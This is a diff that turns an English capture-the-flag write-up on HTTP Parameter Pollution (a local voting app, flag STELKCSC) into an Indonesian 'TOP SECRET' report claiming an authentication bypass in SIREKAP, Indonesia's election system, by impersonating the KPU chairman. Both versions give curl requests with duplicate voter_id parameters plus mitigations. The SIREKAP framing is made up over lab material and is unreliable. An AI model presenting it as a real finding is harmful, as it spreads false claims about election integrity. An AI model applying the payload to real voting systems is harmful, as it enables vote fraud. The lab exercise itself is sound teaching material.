@@ -1,70 +1,62 @@
-# 🗳️ Employee Excellence Awards - Writeup
+# 📑 Laporan Celah Keamanan SIREKAP v2.4
 
-## Challenge Overview
-**Name:** The Twin Identity  
-**Category:** HTTP Parameter Pollution (HPP)  
-**Difficulty:** Medium  
+**Klasifikasi:** SANGAT RAHASIA (TOP SECRET)  
+**Judul:** Bypass Autentikasi Suara via Manipulasi Parameter (HTTP Parameter Pollution)  
+**Target:** Modul e-Voting (`/vote`)  
+**Pelapor:** Cyber Security Force Indonesia
+
+## Ringkasan Eksekutif
+Ditemukan celah keamanan kritis pada mekanisme validasi NIK di sistem SIREKAP. Penyerang dapat memanipulasi permintaan suara (vote) untuk menyamar sebagai pejabat tinggi KPU (Ketua KPU) dengan memanfaatkan ketidakkonsistenan pembacaan parameter ganda.
+
 **Flag:** `STELKCSC{p4r4m3t3r_p0llut10n_tw1n_1d3nt1ty}`
 
-## Vulnerability
+---
 
-The application has inconsistent parameter handling:
-- **Security check** reads the **first** `voter_id` parameter
-- **Backend processing** uses the **last** `voter_id` parameter
+## Analisis Teknis (Root Cause)
 
-This allows bypassing the security check while executing with elevated privileges.
+Sistem memiliki ketidakkonsistenan logika antara Middleware Keamanan (WAF) dan Aplikasi Backend:
+1.  **Middleware Keamanan**: Hanya memeriksa parameter `voter_id` **PERTAMA** untuk validasi sesi.
+2.  **Aplikasi Backend**: Mengambil parameter `voter_id` **TERAKHIR** untuk memproses suara.
 
-## Discovery
+### Data Referensi NIK
+- **Warga Sipil (Anda)**: `3174052001950005`
+- **Ketua KPU (Target)**: `9999000011112222`
 
-### Step 1: Normal Flow
-1. Login as Budi (E001)
-2. Vote for a candidate
-3. Notice URL contains `voter_id=E001`
+---
 
-### Step 2: Test Direct Access
+## Langkah Reproduksi (Proof of Concept)
+
+### Skenario 1: Percobaan Ilegal Langsung
+Mencoba mengganti NIK secara langsung akan ditolak oleh sistem keamanan.
+
 ```bash
-# Try voting as Director (E999) directly
+# GAGAL: Terdeteksi manipulasi
 curl -X POST http://localhost:5008/vote \
-  -d "candidate_id=E001&voter_id=E999"
-# Result: "Security Alert: Voter ID mismatch"
+  -d "candidate_id=01&voter_id=9999000011112222"
 ```
 
-### Step 3: HTTP Parameter Pollution
+**Respon:** `Peringatan Keamanan: NIK tidak cocok.`
+
+### Skenario 2: Eksploitasi Parameter Ganda (HPP)
+Kita mengirimkan parameter `voter_id` dua kali. Yang pertama adalah NIK sah kita (untuk menipu firewall), yang kedua adalah NIK Ketua KPU (untuk dieksekusi backend).
+
 ```bash
-# Send DUPLICATE voter_id parameters
+# SUKSES: Bypass WAF dan Eksekusi Admin
 curl -X POST http://localhost:5008/vote \
-  -d "candidate_id=E001&voter_id=E001&voter_id=E999"
+  -d "candidate_id=02&voter_id=3174052001950005&voter_id=9999000011112222"
 ```
 
-**What happens:**
-- Security Check sees: `voter_id=E001` (first) ✓ Pass
-- Backend sees: `voter_id=E999` (last) → Director privileges!
+**Alur Eksekusi:**
+1.  **WAF Checks**: `voter_id[0] == 3174...0005` (NIK Sesi Kita) -> **LOLOS (PASS)** ✅
+2.  **Backend Uses**: `voter_id[-1] == 9999...2222` (NIK Ketua KPU) -> **EKSEKUSI** 🚀
 
-## Solution
+### Hasil
+Pada respon `success.html`, sistem akan menampilkan pesan "Verifikasi KPU Pusat" yang berisi Flag rahasia.
 
-### Method 1: Intercept with Burp Suite
-1. Vote normally and intercept POST request
-2. Add duplicate parameter: `voter_id=E001&voter_id=E999`
-3. Forward request → Flag in response
+---
 
-### Method 2: Modify Form
-1. Open DevTools → Elements
-2. Find hidden `voter_id` input
-3. Add another input: `<input name="voter_id" value="E999">`
-4. Submit form → Flag appears
-
-### Method 3: cURL
-```bash
-curl -X POST http://localhost:5008/vote \
-  -d "candidate_id=E002&voter_id=E001&voter_id=E999"
-```
-
-## Flag
-```
-STELKCSC{p4r4m3t3r_p0llut10n_tw1n_1d3nt1ty}
-```
-
-## Key Takeaways
-1. **Consistent parameter handling** - All layers must read parameters the same way
-2. **HPP is often overlooked** - Many apps don't handle duplicate params consistently
-3. **Defense in depth** - Validate at multiple layers with consistent logic
+## Mitigasi & Rekomendasi
+Untuk Tim IT KPU Pusat:
+1.  **Normalisasi Input**: Tolak permintaan yang memiliki parameter ganda untuk field sensitif.
+2.  **Konsistensi Parser**: Pastikan WAF dan Backend menggunakan logika parsing HTTP yang identik (Standarisasi RFC).
+3.  **Validasi Ketat**: Gunakan data dari sesi sisi server (`session['nik']`) daripada mempercayai input pengguna (`request.form`).
